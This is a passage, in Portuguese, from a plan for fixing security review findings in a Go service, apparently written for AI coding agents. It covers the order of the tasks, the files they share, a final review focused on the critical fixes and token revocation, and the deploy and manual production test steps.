  mesma função (guarda equivalente: confira antes de tentar recriar). **Task 11 também reaproveita**
  (idem). Como todas as três já checam existência antes de adicionar, a ordem exata entre elas não
  quebra nada — mas seguir 2 → 6 → 11 evita qualquer necessidade de checagem na prática, já que quem
  vem depois sempre encontra a função já criada por quem veio antes.
- **Task 6 e Task 13** tocam `internal/auth/service.go`, em funções diferentes (`Middleware`/
  `generateToken`/`Claims` no Task 6; `Login` no Task 13) — sem conflito de código, só sequenciados
  pra manter o ledger simples.
- **Task 8 cria `helpers_test.go`** (se ainda não existir); **Task 12 reaproveita o mesmo arquivo**
  para os testes de `clampLimit` — mesma lógica de "confira se o arquivo já existe" antes de recriar.

Tasks 3, 4, 5, 7, 9, 10 são totalmente independentes entre si e do resto — podem rodar em qualquer
posição relativa, desde que depois das duas Critical (1, 2).

Após todas as 13 tasks: revisão final de branch inteira (whole-branch review) no modelo mais capaz
disponível — com atenção extra a (a) Task 1/2 (os dois Critical, confirmar que o exploit documentado
na revisão de segurança realmente não funciona mais), (b) Task 6 (a lógica de revogação de token é a
mais arriscada de quebrar login legítimo por engano), (c) Task 10 (confirmar que backups já gerados
antes desta correção — se algum existir em produção — ainda restauram) — depois
`finishing-a-development-branch` (merge local em `main`), deploy manual (build → `.deb` → scp →
instalar em produção → verificar `/api/health`), tag `vX.Y.Z` + push, e teste manual em produção dos
fluxos mais sensíveis (login, troca de senha derruba sessão antiga, VPN aceita nome/endereço válido e
rejeita malformado, RBAC bloqueia auto-promoção) antes de considerar concluído.
